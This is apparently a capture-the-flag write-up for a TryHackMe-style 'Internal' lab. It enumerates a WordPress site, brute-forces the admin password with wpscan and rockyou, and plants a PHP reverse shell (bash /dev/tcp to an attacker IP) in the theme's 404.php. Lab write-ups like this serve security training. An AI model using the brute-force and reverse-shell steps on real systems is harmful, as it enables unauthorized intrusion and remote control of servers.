# Internal

```jsx
sudo nano /etc/hosts
<TARGET_IP> internal.thm
```

```jsx
└─$ nmap -sC -sV -oN scan.txt internal.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 17:15 CET
Nmap scan report for internal.thm (10.113.186.196)
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
                                                              
```

```jsx
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
```

i get the internal/blog , a wordpress login , and a phpmyadmin login

enumerating wordpress :

```jsx
wpscan --url http://internal.thm/wordpress --enumerate u
```

we find , Username : admin

wordpress versoin : 5.4.2 (old and vulnerable)

XML-RPC enabled ,  a feature in WordPress that allows **remote communication** with the site.

now WorsPress brute force 

```jsx
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
```

we got Username: admin and Password: my2boys

we login into wordpress 

then 

Appearence → Theme Editor then open 404.php

use a reverse shell

```jsx
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
?>
```

than trigger the shell

```jsx
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

ip a into the machie we see

10.113.186.196 the machine ip

172.17.0.1 (docker0) there are a docker container runing